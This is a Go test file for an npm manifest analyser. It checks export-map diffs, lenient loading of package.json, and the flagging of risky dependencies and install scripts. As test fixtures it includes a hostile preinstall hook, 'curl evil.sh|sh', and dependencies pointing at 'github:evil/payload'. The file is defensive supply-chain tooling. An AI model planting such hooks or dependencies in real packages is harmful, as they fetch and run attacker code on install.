package npmpkg

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

// commander 14 -> 15 shape: dual require/import collapses to single default
// under a type flip, and a subpath export disappears.
func TestExportsDeltaCommanderShape(t *testing.T) {
	old := &Package{
		Version: "14.0.3",
		Type:    "commonjs",
		Main:    "./index.js",
		Exports: json.RawMessage(`{
			".": {"types": "./typings/index.d.ts", "require": "./index.js", "import": "./esm.mjs"},
			"./esm.mjs": "./esm.mjs"
		}`),
	}
	niu := &Package{
		Version: "15.0.0",
		Type:    "module",
		Main:    "./index.js",
		Exports: json.RawMessage(`{
			".": {"types": "./typings/index.d.ts", "default": "./index.js"}
		}`),
	}
	changes, err := ExportsDelta(old, niu)
	if err != nil {
		t.Fatal(err)
	}

	byKey := map[string]ExportChange{}
	for _, c := range changes {
		byKey[c.Subpath+" "+c.Condition] = c
	}

	c, ok := byKey[". require"]
	if !ok {
		t.Fatal("no change row for \".\" require")
	}
	if c.From != "./index.js (cjs)" || c.To != "./index.js (esm)" {
		t.Errorf("\".\" require: %q -> %q", c.From, c.To)
	}
	if c.Note == "" {
		t.Error("format flip under same path should carry a note")
	}

	c, ok = byKey["./esm.mjs import"]
	if !ok {
		t.Fatal("no change row for removed ./esm.mjs subpath")
	}
	if c.To != "" {
		t.Errorf("removed subpath still resolves: %q", c.To)
	}
}

func TestExportsDeltaLegacyFallback(t *testing.T) {
	old := &Package{Version: "1", Main: "lib/index.js"}
	niu := &Package{Version: "2", Main: "lib/index.js", Type: "module"}
	changes, err := ExportsDelta(old, niu)
	if err != nil {
		t.Fatal(err)
	}
	if len(changes) != 2 { // require + import rows both flip format
		t.Fatalf("changes = %+v", changes)
	}
	for _, c := range changes {
		if c.From != "./lib/index.js (cjs)" || c.To != "./lib/index.js (esm)" {
			t.Errorf("%s %s: %q -> %q", c.Subpath, c.Condition, c.From, c.To)
		}
	}
}

func TestExportsConditionOrder(t *testing.T) {
	// key order matters: node before default must win for both conditions
	p := &Package{
		Version: "1",
		Exports: json.RawMessage(`{"node": "./node.js", "default": "./browser.js"}`),
	}
	same := &Package{
		Version: "2",
		Exports: json.RawMessage(`{"default": "./browser.js", "node": "./node.js"}`),
	}
	changes, err := ExportsDelta(p, same)
	if err != nil {
		t.Fatal(err)
	}
	// reordering changes resolution: default now shadows node
	if len(changes) != 2 {
		t.Fatalf("want 2 changes from key reorder, got %+v", changes)
	}
	for _, c := range changes {
		if c.From != "./node.js (cjs)" || c.To != "./browser.js (cjs)" {
			t.Errorf("%s: %q -> %q", c.Condition, c.From, c.To)
		}
	}
}

func TestDepsDeltaFlags(t *testing.T) {
	old := &Package{Deps: map[string]string{"a": "^1.0.0"}}
	niu := &Package{Deps: map[string]string{
		"a": "^2.0.0",
		"b": "github:evil/payload",
		"c": "https://example.com/c.tgz",
	}}
	delta := DepsDelta(old, niu)
	flags := 0
	for _, d := range delta {
		if d.Flag != "" {
			flags++
		}
	}
	if flags != 2 {
		t.Errorf("want 2 flagged deps, got %d: %+v", flags, delta)
	}
}

func TestLifecycleDelta(t *testing.T) {
	old := &Package{Scripts: map[string]string{"test": "mocha", "postinstall": "node x.js"}}
	niu := &Package{Scripts: map[string]string{"test": "mocha", "postinstall": "node y.js", "preinstall": "curl evil.sh|sh"}}
	delta := LifecycleDelta(old, niu)
	if len(delta) != 2 {
		t.Fatalf("delta = %+v", delta)
	}
	// non-lifecycle scripts (test) must not appear
	for _, c := range delta {
		if c.Key == "test" {
			t.Error("test script is not lifecycle")
		}
	}
}

// A package npm would install must never fail analysis: unknown fields
// ignored, misshapen known fields degrade to a warning.
func TestLoadForgiving(t *testing.T) {
	dir := t.TempDir()
	weird := `{
		"name": "ancient", "version": "0.0.1",
		"engines": ["node >=0.10"],
		"scripts": {"test": "mocha", "weird": 42},
		"bin": "./cli.js",
		"totallyUnknownField": {"nested": [1,2,3]},
		"dependencies": {"a": "^1.0.0"}
	}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(weird), 0o644); err != nil {
		t.Fatal(err)
	}
	p, err := Load(dir)
	if err != nil {
		t.Fatalf("forgiving load failed: %v", err)
	}
	if p.Name != "ancient" || p.Deps["a"] != "^1.0.0" {
		t.Errorf("well-formed fields lost: %+v", p)
	}
	if p.Scripts["test"] != "mocha" {
		t.Errorf("salvageable script lost: %v", p.Scripts)
	}
	if len(p.Warnings) < 2 { // engines array + scripts mixed types
		t.Errorf("warnings = %v", p.Warnings)
	}
	if len(p.Engines) != 0 {
		t.Errorf("array engines should degrade to empty: %v", p.Engines)
	}
}

func TestPresentHelpers(t *testing.T) {
	p := &Package{
		Scripts: map[string]string{"postinstall": "node s.js", "test": "mocha"},
		Deps:    map[string]string{"a": "^1.0.0", "b": "github:evil/b"},
	}
	life := LifecyclePresent(p)
	if len(life) != 1 || life[0].Key != "postinstall" || life[0].Status != "present" {
		t.Errorf("LifecyclePresent = %+v", life)
	}
	deps := DepsPresent(p)
	var flagged int
	for _, d := range deps {
		if d.Status != "present" {
			t.Errorf("dep not 'present': %+v", d)
		}
		if d.Flag != "" {
			flagged++
		}
	}
	if len(deps) != 2 || flagged != 1 {
		t.Errorf("DepsPresent = %+v", deps)
	}
}
